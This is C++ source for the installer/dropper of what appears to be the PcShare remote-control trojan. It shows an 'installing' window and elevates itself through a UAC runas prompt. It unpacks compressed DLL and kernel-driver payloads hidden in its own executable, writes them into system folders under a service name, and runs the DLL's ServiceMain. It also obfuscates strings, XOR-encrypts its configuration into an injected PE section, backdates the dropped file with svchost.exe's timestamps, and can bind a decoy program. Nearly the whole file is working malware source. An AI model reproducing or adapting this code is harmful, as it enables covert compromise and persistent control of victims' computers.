// PcStart.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "PcStart.h"
#include "Lzw.h"
#include "MainFrm.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

typedef void (WINAPI* PCMAINFUNCO)(PSDLLINFO, DWORD*);
typedef void (WINAPI* SERVICEMAIN)(ULONG, LPTSTR*);

DWORD WorkThread(LPVOID lPvoid);
DWORD DoWork(LPCTSTR m_lpCmdLine);
Type IsShellSysType();
void MakeWakeUp();
BYTE* GetCmdType();

#define _PCMAIN

/////////////////////////////////////////////////////////////////////////////
// CPcStartApp

BEGIN_MESSAGE_MAP(CPcStartApp, CWinApp)
	//{{AFX_MSG_MAP(CPcStartApp)

		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcStartApp construction

CPcStartApp::CPcStartApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CPcStartApp object

CPcStartApp theApp;

BOOL CPcStartApp::InitInstance()
{
	CMainFrame* pFrame = new CMainFrame;
	m_pMainWnd = pFrame;
	pFrame->Create(NULL, "正在安装...");
	::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) WorkThread, (LPVOID) m_lpCmdLine, 0, NULL);
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CPcStartApp initialization

DWORD WorkThread(LPVOID lPvoid)
{
	DoWork((char*) lPvoid);
	AfxGetMainWnd()->PostMessage(WM_CLOSE, 0, 0);
	return 0;
}

#ifdef _DEBUG
DWORD DoWork(LPCTSTR m_lpCmdLine)
{
	PSDLLINFO m_Info = {0};
	ULONG nCmd = 0;
	HMODULE hDemonMoudle = NULL;

	lstrcpy(m_Info.m_ServerAddr, "127.0.0.1");
	m_Info.m_ServerPort = 80;
	lstrcpy(m_Info.m_ServiceName, "asdasdss");
	lstrcpy(m_Info.m_ServiceView, "asdasdss");
//	lstrcpy(m_Info.m_Group, "测试1");
	lstrcpy(m_Info.m_SoftVer, "国庆节特别版[2009]");
//	lstrcpy(m_Info.m_DdnsUrl, "www.pcshares.cn/tmp/ip.txt");
	lstrcpy(m_Info.m_ID, "0123546790123456");
	m_Info.m_IsKeyMon = FALSE;
	m_Info.m_DelayTime = 2000;
//	m_Info.m_PassWord = 123456;

	char m_DllPath[256] = {0};
	GetModuleFileName(NULL, m_DllPath, 255);
	char* pFind = StrRChr(m_DllPath, NULL, '\\');
	if(pFind != NULL)
	{

#ifdef _PCMAIN
		lstrcpy(pFind, "\\pcmain.dll");
#else
		lstrcpy(pFind, "\\pcmake.dll");
#endif
	}

	nCmd = PS_TEST_DLL;

	//取启动DLL
	hDemonMoudle = LoadLibrary(m_DllPath);
	if(hDemonMoudle == NULL)
	{
		return -1;
	}

#ifdef _PCMAIN
	
	//取函数
	PCMAINFUNCO PcMainFuncO = (PCMAINFUNCO) GetProcAddress(hDemonMoudle, "Vip20101125");
	if(PcMainFuncO != NULL)
	{
		DWORD mRet = 0;
		PcMainFuncO(m_Info, &mRet);
	}

#else

	//取函数
	SERVICEMAIN ServiceMain = (SERVICEMAIN) GetProcAddress(hDemonMoudle, "ServiceMain");
	if(ServiceMain != NULL)
	{
		ServiceMain(nCmd, (LPTSTR*) &m_Info);
	}

#endif

	FreeLibrary(hDemonMoudle);
	return 0;
}
#else
DWORD DoWork(LPCTSTR m_lpCmdLine)
{
	if(strlen(m_lpCmdLine) == 0)
	{
		Type m_SysTemType = IsShellSysType();
		if(m_SysTemType == Vista || m_SysTemType == Windows7)
		{
			SHELLEXECUTEINFOW m_ExecInfo = {0};

			char m_AFileName[256] = {0};
			WCHAR m_WFileName[256] = {0};
			GetModuleFileName(NULL, m_AFileName, 255);

			MultiByteToWideChar(CP_ACP, 0, m_AFileName, strlen(m_AFileName), m_WFileName, 255);
			m_ExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
			m_ExecInfo.lpFile = m_WFileName;
			m_ExecInfo.lpVerb = L"runas";
			m_ExecInfo.nShow = SW_SHOW;
			m_ExecInfo.lpParameters = L"TWO";

			HMODULE hShellModule = LoadLibrary("Shell32.dll");
			if(hShellModule == NULL)
			{
				return 0;
			}

			MyShellExecuteExW P_ShellExecuteExW = (MyShellExecuteExW) GetProcAddress(hShellModule, "ShellExecuteExW");
			P_ShellExecuteExW(&m_ExecInfo);
			FreeLibrary(hShellModule);
			return 0;
		}
	}

	//取启动类型
	BYTE* pReturn = GetCmdType();
	if(pReturn == NULL)
	{
		return 0;
	}

	//赋值启动类型
	BOOL bIsFileComb = FALSE;
	DWORD nCmdType = *((DWORD*) pReturn);
	pReturn += sizeof(DWORD);
	if(nCmdType == PS_START_UPDATE)	//更新主程序
	{
		DWORD nReturn = *((DWORD*) pReturn);
		while(!PostThreadMessage(nReturn, WM_CLOSE_CLIENT_THREAD, TRUE, FALSE))
		{
			Sleep(50);
		}
		Sleep(3000);
	}
	else if(nCmdType == PS_START_FILECOPY)
	{
		//分解执行程序
		bIsFileComb = TRUE;
	}

	PSDLLINFO m_Info = {0};

	//初始化数据
	char m_DllFilePath[256] = {0};
	if(!LoadInitInfo(&m_Info, m_DllFilePath, bIsFileComb, m_lpCmdLine))
	{
		return -1;	
	}

	//取启动DLL
	HMODULE hDemonMoudle = LoadLibrary(m_DllFilePath);
	if(hDemonMoudle == NULL)
	{
		return -1;
	}

	//ServiceMain
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'S';
	m_TempStr[1] = 'e';
	m_TempStr[2] = 'r';
	m_TempStr[3] = 'v';
	m_TempStr[4] = 'i';
	m_TempStr[5] = 'c';
	m_TempStr[6] = 'e';
	m_TempStr[7] = 'M';
	m_TempStr[8] = 'a';
	m_TempStr[9] = 'i';
	m_TempStr[10] = 'n';
	m_TempStr[11] = 0x00;

	//取函数
	SERVICEMAIN ServiceMain = (SERVICEMAIN) GetProcAddress(hDemonMoudle, m_TempStr);
	if(ServiceMain != NULL)
	{
		ServiceMain(PS_NAKE_SERVICE, (LPTSTR*) &m_Info);
	}
	FreeLibrary(hDemonMoudle);

	
	return 0;
}
#endif

BYTE* GetCmdType()
{
	char m_FileName[256] = {0};
	GetModuleFileName(NULL, m_FileName, 255);
	HANDLE hFile = CreateFile(m_FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	DWORD nReadLen = 0;
	DWORD nFileLen = GetFileSize(hFile, NULL);
	CloseHandle(hFile);

	//修改标志
	//This
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'T';
	m_TempStr[1] = 'h';
	m_TempStr[2] = 'i';
	m_TempStr[3] = 's';
	m_TempStr[4] = 0x00;

	//修改EXE数据标志
	BYTE* pData = (BYTE*) GetModuleHandle(NULL);
	BYTE* pCmd = NULL;
	for(DWORD i = 0; i < nFileLen; i++)
	{
		if(memcmp(&pData[i], m_TempStr, 4) == 0)
		{
			pCmd = (BYTE*) &pData[i + 4];
			break;
		}
	}
	return pCmd;
}

Type IsShellSysType()
{
	Type ShellType = WindowsNT4;
	OSVERSIONINFO osvi = {0};
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	DWORD winVer = GetVersion();
	if(winVer < 0x80000000)
	{
		GetVersionEx(&osvi);
		if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 0L)
		{
			ShellType=Windows2000;
		}
		else if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 1L)
		{
			ShellType=WindowsXP;
		}
		else if((osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 2L))
		{
			ShellType = Windows2003;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 0L))
		{
			ShellType = Vista;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 1L))
		{
			ShellType = Windows7;
		}
		else
		{
			ShellType=WindowsNT4;
		}
	}
	return ShellType;
}

BOOL GetStrValue(LPCTSTR pStr, LPCTSTR pName, LPTSTR pValue)
{
	//%s=
	char m_TempStr[256] = {0};
	m_TempStr[0] = '%';
	m_TempStr[1] = 's';
	m_TempStr[2] = '=';
	m_TempStr[3] = 0x00;

	TCHAR m_Str[MAX_PATH] = {0};
	TCHAR m_Name[MAX_PATH] = {0};
	TCHAR m_Value[MAX_PATH] = {0};
	wsprintf(m_Name, m_TempStr, pName);
	StrCpy(m_Str, pStr);

	TCHAR* pStart = StrStr(m_Str, pName);
	if(pStart == NULL)
	{
		return FALSE;
	}
	pStart += lstrlen(m_Name);
	
	TCHAR* pEnd = StrChr(pStart, ';');
	if(pEnd == NULL)
	{
		pEnd = m_Str + lstrlen(m_Str);
	}
	CopyMemory(pValue, pStart, (pEnd - pStart) * sizeof(TCHAR));
	pValue[pEnd - pStart] = 0;
	return TRUE;
}

BOOL WriteMyFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	DeleteFile(m_FileName);
	HANDLE hFile = CreateFile(
		m_FileName,  
		GENERIC_WRITE,   
		0, 
		NULL,           
		CREATE_NEW,      
		FILE_ATTRIBUTE_NORMAL, 
		NULL);

	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nWriteLen = 0;
	WriteFile(hFile, pData, nLen, &nWriteLen, NULL);

	CloseHandle(hFile);
	return TRUE;
}

BOOL CheckOldVer(LPPSDLLINFO pInfo)
{
	char m_MutexStr[64] = {0};
	m_MutexStr[0] = 'G';
	m_MutexStr[1] = 'l';
	m_MutexStr[2] = 'o';
	m_MutexStr[3] = 'b';
	m_MutexStr[4] = 'a';
	m_MutexStr[5] = 'l';
	m_MutexStr[6] = '\\';
	m_MutexStr[7] = 'd';
	m_MutexStr[8] = 'z';
	m_MutexStr[9] = '%';
	m_MutexStr[10] = '0';
	m_MutexStr[11] = '8';
	m_MutexStr[12] = 'x';

	//加共享锁
	char m_MutexName[256] = {0};
	wsprintf(m_MutexName, m_MutexStr, pInfo->m_CreateFlag);
	HANDLE hMutex = CreateMutex(NULL, FALSE, m_MutexName);
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMutex);
		return FALSE;
	}

	if(WaitForSingleObject(hMutex, 30000) == WAIT_OBJECT_0)
	{
		char m_TmpStr[128] = {0};
		m_TmpStr[0] = '0';

		char m_SysTempPath[256] = {0};
		GetTempPath(200, m_SysTempPath);

		//检查批次号，防止多次启动
		char m_FlagFileName[256] = {0};
		wsprintf(m_FlagFileName, "%s\\%08x.tmp", m_SysTempPath, pInfo->m_CreateFlag);
		WIN32_FILE_ATTRIBUTE_DATA m_FileData = {0};
		if(GetFileAttributesEx(m_FlagFileName, GetFileExInfoStandard, &m_FileData) || 
			!WriteMyFile(m_FlagFileName, m_TmpStr, 1))
		{
			ReleaseMutex(hMutex);
			CloseHandle(hMutex);
			return FALSE;
		}
	}
	else
	{
		CloseHandle(hMutex);
		return FALSE;
	}

	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	return TRUE;
}

BOOL LoadInitInfo(LPPSDLLINFO pInfo, char* m_DllFilePath, BOOL IsFileComb, LPCTSTR pCmdLines)
{
	//文件数据
	DWORD nReadLen = 0;
	char m_ExeFileName[MAX_PATH] = {0};
	GetModuleFileName(NULL, m_ExeFileName, 200);
	HANDLE hFile = CreateFile(m_ExeFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nFileLen = GetFileSize(hFile, NULL);
	BYTE* pFileData = new BYTE[nFileLen];
	ReadFile(hFile, pFileData, nFileLen, &nReadLen, NULL);
	CloseHandle(hFile);

	//查找存储文件标志
	LPMYSAVEFILEINFO pSaveInfo = NULL;
	for(DWORD i = nFileLen - sizeof(ULONGLONG); i > sizeof(ULONGLONG); i--)
	{
		if(*(ULONGLONG*) &pFileData[i] == PS_VER_ULONGLONG)
		{
			pSaveInfo = (LPMYSAVEFILEINFO) &pFileData[i];
			break;
		}
	}
	if(pSaveInfo == NULL)
	{
		delete [] pFileData;
		return FALSE;
	}

	FCLzw lzw;
	
	//附加信息数据
	BYTE* pZipInfoData = ((BYTE*) pSaveInfo) + sizeof(MYSAVEFILEINFO);
	DWORD nSrcInfoDataLen = 0;
	BYTE* pSrcInfoData = NULL;
	lzw.PcUnZip(pZipInfoData, &pSrcInfoData, &nSrcInfoDataLen);
	CopyMemory(pInfo, pSrcInfoData, nSrcInfoDataLen);
	delete [] pSrcInfoData;

	if(IsFileComb)
	{
		DWORD nSrcComDataLen = 0;
		BYTE* pZipComData = pZipInfoData + pSaveInfo->m_Size + pInfo->m_DllFileLen + pInfo->m_SysFileLen;
		BYTE* pComFileData = NULL;
		lzw.PcUnZip(pZipComData, &pComFileData, &nSrcComDataLen);
		delete [] pFileData;

		//修改原始文件
		while(1)
		{
			if(WriteMyFile(pCmdLines, pComFileData, nSrcComDataLen))
			{
				break;
			}
			Sleep(50);
		}
		delete [] pComFileData;
		ShellExecute(NULL, NULL, pCmdLines, NULL, NULL, SW_SHOW);
		return FALSE;
	}

	if(pInfo->m_ComFileLen > 0)
	{
		//需要开始文件捆绑了
		char m_FileName[256] = {0};
		GetModuleFileName(NULL, m_FileName, 255);
		HANDLE hFile = CreateFile(m_FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			DWORD nReadLen = 0;
			DWORD nFileLen = GetFileSize(hFile, NULL);
			BYTE* pData = new BYTE[nFileLen];
			ReadFile(hFile, pData, nFileLen, &nReadLen, NULL);
			CloseHandle(hFile);

			//This
			char m_TempStr[256] = {0};
			m_TempStr[0] = 'T';
			m_TempStr[1] = 'h';
			m_TempStr[2] = 'i';
			m_TempStr[3] = 's';
			m_TempStr[4] = 0x00;

			//修改EXE数据标志
			BYTE* pCmd = NULL;
			for(DWORD i = 0; i < nFileLen; i++)
			{
				if(memcmp(&pData[i], m_TempStr, 4) == 0)
				{
					pCmd = (BYTE*) &pData[i + 4];
					break;
				}
			}

			if(pCmd != NULL)
			{
				*((DWORD*) pCmd) = PS_START_FILECOPY;

				//%08x.exe
				m_TempStr[0] = '%';
				m_TempStr[1] = '0';
				m_TempStr[2] = '8';
				m_TempStr[3] = 'x';
				m_TempStr[4] = '.';
				m_TempStr[5] = 'e';
				m_TempStr[6] = 'x';
				m_TempStr[7] = 'e';
				m_TempStr[8] = 0x00;

				char m_TmpFilePath[256] = {0};
				GetTempPath(250, m_TmpFilePath);
				wsprintf(m_TmpFilePath + lstrlen(m_TmpFilePath), m_TempStr, GetCurrentThreadId());
				WriteMyFile(m_TmpFilePath, pData, nFileLen);

				//运行恢复程序
				char m_ExeFileName[256] = {0};
				GetModuleFileName(NULL, m_ExeFileName, 255);

				ShellExecute(NULL, NULL, m_TmpFilePath, m_ExeFileName, NULL, SW_SHOW);
			}
			delete [] pData;
		}
	}

	//DLL文件数据
	DWORD nSrcDllDataLen = 0;
	BYTE* pZipDllData = pZipInfoData + pSaveInfo->m_Size;
	BYTE* pDllFileData = NULL;
	lzw.PcUnZip(pZipDllData, &pDllFileData, &nSrcDllDataLen);

	//SYS文件数据
	DWORD nSrcSysDataLen = 0;
	BYTE* pZipSysData = pZipDllData + pInfo->m_DllFileLen;
	BYTE* pSysFileData = NULL;
	if(pInfo->m_SysFileLen > 0)
	{
		lzw.PcUnZip(pZipSysData, &pSysFileData, &nSrcSysDataLen);
	}

	//删除原始缓冲
	delete [] pFileData;

	//系统目录
	char m_TempStr[256] = {0};
	char m_SysTempPath[256] = {0};
	GetSystemDirectory(m_SysTempPath, 255);

	if(pInfo->m_DirAddr)
	{
		/*C:\\Program Files\\Common Files\\Microsoft Shared*/
		m_TempStr[0] = 'C';
		m_TempStr[1] = ':';
		m_TempStr[2] = '\\';
		m_TempStr[3] = 'P';
		m_TempStr[4] = 'r';
		m_TempStr[5] = 'o';
		m_TempStr[6] = 'g';
		m_TempStr[7] = 'r';
		m_TempStr[8] = 'a';
		m_TempStr[9] = 'm';
		m_TempStr[10] = ' ';
		m_TempStr[11] = 'F';
		m_TempStr[12] = 'i';
		m_TempStr[13] = 'l';
		m_TempStr[14] = 'e';
		m_TempStr[15] = 's';
		m_TempStr[16] = '\\';
		m_TempStr[17] = 'C';
		m_TempStr[18] = 'o';
		m_TempStr[19] = 'm';
		m_TempStr[20] = 'm';
		m_TempStr[21] = 'o';
		m_TempStr[22] = 'n';
		m_TempStr[23] = ' ';
		m_TempStr[24] = 'F';
		m_TempStr[25] = 'i';
		m_TempStr[26] = 'l';
		m_TempStr[27] = 'e';
		m_TempStr[28] = 's';
		m_TempStr[29] = '\\';
		m_TempStr[30] = 'M';
		m_TempStr[31] = 'i';
		m_TempStr[32] = 'c';
		m_TempStr[33] = 'r';
		m_TempStr[34] = 'o';
		m_TempStr[35] = 's';
		m_TempStr[36] = 'o';
		m_TempStr[37] = 'f';
		m_TempStr[38] = 't';
		m_TempStr[39] = ' ';
		m_TempStr[40] = 'S';
		m_TempStr[41] = 'h';
		m_TempStr[42] = 'a';
		m_TempStr[43] = 'r';
		m_TempStr[44] = 'e';
		m_TempStr[45] = 'd';
		m_TempStr[46] = 0x00;
		m_TempStr[0] = m_SysTempPath[0];
		StrCpy(m_SysTempPath, m_TempStr);
	}

	//查找是否多次运行
	if(!CheckOldVer(pInfo))
	{
		if(pDllFileData != NULL)
		{
			delete [] pDllFileData;
		}
		if(pSysFileData != NULL)
		{
			delete [] pSysFileData;
		}
		return FALSE;
	}

	//DLL文件保存目录
	//%s\\%s.dll
	m_TempStr[0] = '%';
	m_TempStr[1] = 's';
	m_TempStr[2] = '\\';
	m_TempStr[3] = '%';
	m_TempStr[4] = 's';
	m_TempStr[5] = '.';
	m_TempStr[6] = 'd';
	m_TempStr[7] = 'l';
	m_TempStr[8] = 'l';
	m_TempStr[9] = 0x00;
	wsprintf(m_DllFilePath, m_TempStr, m_SysTempPath, pInfo->m_ServiceName);
	
	if(pSysFileData != NULL)
	{
		//sys文件存放目录
		//%s\\drivers\\%s.dll
		char m_SysFilePath[256] = {0};
		m_TempStr[0] = '%';
		m_TempStr[1] = 's';
		m_TempStr[2] = '\\';
		m_TempStr[3] = 'd';
		m_TempStr[4] = 'r';
		m_TempStr[5] = 'i';
		m_TempStr[6] = 'v';
		m_TempStr[7] = 'e';
		m_TempStr[8] = 'r';
		m_TempStr[9] = 's';
		m_TempStr[10] = '\\';
		m_TempStr[11] = '%';
		m_TempStr[12] = 's';
		m_TempStr[13] = '.';
		m_TempStr[14] = 's';
		m_TempStr[15] = 'y';
		m_TempStr[16] = 's';
		m_TempStr[17] = 0x00;
		wsprintf(m_SysFilePath, m_TempStr, m_SysTempPath, pInfo->m_ServiceName);
		WriteMyFile(m_SysFilePath, pSysFileData, nSrcSysDataLen);
		delete [] pSysFileData;
	}

	//唯一标识
	DWORD* pReturn = (DWORD*) GetCmdType();
	ASSERT(pReturn);
	if(*pReturn == PS_START_UPDATE)
	{
		//程序更新，保持原来标识
		memcpy((BYTE*) pInfo->m_ID, pReturn + 2, 16);
	}
	else
	{
		CoCreateGuid((GUID*) pInfo->m_ID);
	}

	//原始exe目录
	strcpy(pInfo->m_ExeFilePath, m_ExeFileName);

	//保存dll到文件
	int nStrSize = sizeof(ULONGLONG);
	DWORD nInfoDataLen = sizeof(PSDLLINFO);
	LPBYTE pSaveData = new BYTE[nInfoDataLen * 2 + nStrSize];
	*((ULONGLONG*) pSaveData) = PS_VER_ULONGLONG;

	LPBYTE pTmpData = pSaveData + nStrSize;
	LPBYTE pKeyData = pSaveData + nInfoDataLen + nStrSize;

	memcpy(pTmpData, pInfo, nInfoDataLen);

	//取随机数据
	srand((unsigned) time(NULL));
	for(i = 0; i < nInfoDataLen; i++)
	{
		pKeyData[i] = rand();
	}

	//加密数据
	for(i = 0; i < nInfoDataLen; i++)
	{
		pTmpData[i] = pTmpData[i] ^ pKeyData[i];
	}
	AddDataToPe(pSaveData, nInfoDataLen * 2 + nStrSize, pDllFileData, nSrcDllDataLen, m_DllFilePath);
	delete [] pSaveData;
	delete [] pDllFileData;
	return TRUE;
}

BOOL AddDataToPe(BYTE* pSaveData, DWORD DataLen, BYTE* pPeData, DWORD nPeLen, LPCTSTR pPeFile)
{
	// PE头偏移
	DWORD dwPE_Header_OffSet = *(DWORD *)(pPeData + 0x3C);
	
	// 取得 PE 头
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pPeData + dwPE_Header_OffSet);
	
	// 判断是否有效的PE文件
	if (pPE_Header->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	// 计算新节的偏移地址
	DWORD dwMySectionOffSet = dwPE_Header_OffSet;
	dwMySectionOffSet += 4;		//sizeof("PE\0\0")
	dwMySectionOffSet += sizeof(IMAGE_FILE_HEADER);
	dwMySectionOffSet += sizeof(IMAGE_OPTIONAL_HEADER32);
	dwMySectionOffSet += pPE_Header->FileHeader.NumberOfSections * 0x28;	//NumberOfSections * sizeof(IMAGE_SECTION_HEADER)

	// 检查PE头的空间够不够大
	if(dwMySectionOffSet + 0x28 > pPE_Header->OptionalHeader.SizeOfHeaders)
	{
		// 如果 PE 头的空间不足会失败！
		return FALSE;
	}

	// 新节
	IMAGE_SECTION_HEADER *pNewSec = (IMAGE_SECTION_HEADER *)(pPeData + dwMySectionOffSet);

	// 读取新节位置处的内容，本该是全0
	for (int i = 0; i != 0x28; ++i)
	{
		BYTE bt = *((PBYTE)pNewSec + i);
		if (bt)
		{
			// 非0，说明这个空间已经被那什么延迟加载占用了
			// 只有抹掉image_directory_entry_bound_im，腾出空间。
			memset(pPeData + dwPE_Header_OffSet + 0xD0, 0, 8);
			break;
		}
	}
	
	pNewSec->Misc.VirtualSize = DataLen;
	
	// 新节的RVA
	pNewSec->VirtualAddress = pPE_Header->OptionalHeader.SizeOfImage;

	//SizeOfRawData在EXE文件中是对齐到FileAlignMent的整数倍的值
	pNewSec->SizeOfRawData = DataLen;
	pNewSec->SizeOfRawData /= pPE_Header->OptionalHeader.FileAlignment;
	pNewSec->SizeOfRawData++;
	pNewSec->SizeOfRawData *= pPE_Header->OptionalHeader.FileAlignment;
	
	// 设置新节的 PointerToRawData
	pNewSec->PointerToRawData = nPeLen;
	
	// 设置新节的属性
	pNewSec->Characteristics = 0x40000040;		//可读,，已初始化

	// 增加NumberOfSections
	pPE_Header->FileHeader.NumberOfSections++;

	// 增加SizeOfImage
	pPE_Header->OptionalHeader.SizeOfImage += 
		(pNewSec->Misc.VirtualSize/pPE_Header->OptionalHeader.SectionAlignment + 1) * 
		pPE_Header->OptionalHeader.SectionAlignment;

	// 保存到文件
	HANDLE hFile = CreateFile(
		pPeFile,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL );
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	DWORD dw = 0;
	if (!WriteFile(hFile, pPeData, nPeLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}
	
	if(!WriteFile(hFile, pSaveData, DataLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}

	// 查了N久的bug点：
	int extraLen = pNewSec->SizeOfRawData - DataLen;
	if (extraLen != 0) {
		BYTE * pExtra = new BYTE[extraLen];
		memset(pExtra, 0, extraLen);
		if(!WriteFile(hFile, pExtra, extraLen, &dw, NULL)) {
			delete [] pExtra;
			CloseHandle(hFile);
			return FALSE;
		}
		delete [] pExtra;
	}

	//svchost.exe
	char svchostStr[128] = {0};
	svchostStr[0] = '\\';
	svchostStr[1] = 's';
	svchostStr[2] = 'v';
	svchostStr[3] = 'c';
	svchostStr[4] = 'h';
	svchostStr[5] = 'o';
	svchostStr[6] = 's';
	svchostStr[7] = 't';
	svchostStr[8] = '.';
	svchostStr[9] = 'e';
	svchostStr[10] = 'x';
	svchostStr[11] = 'e';

	//更改时间
	TCHAR m_sCmd[256] = {0};
	GetSystemDirectory(m_sCmd, 200);
	lstrcat(m_sCmd, svchostStr);

	HANDLE hExeFile = CreateFile(
				m_sCmd,  
                GENERIC_READ,   
                FILE_SHARE_READ, 
                NULL,           
                OPEN_EXISTING,      
                FILE_ATTRIBUTE_NORMAL, 
                NULL);
	if(hExeFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return TRUE;
	}

	FILETIME m_FileTime[3] = {0};
	GetFileTime(hExeFile, &m_FileTime[0], &m_FileTime[1], &m_FileTime[2]);
	SetFileTime(hFile, &m_FileTime[0], &m_FileTime[1], &m_FileTime[2]);
	CloseHandle(hExeFile);
	CloseHandle(hFile);
	return TRUE;
}

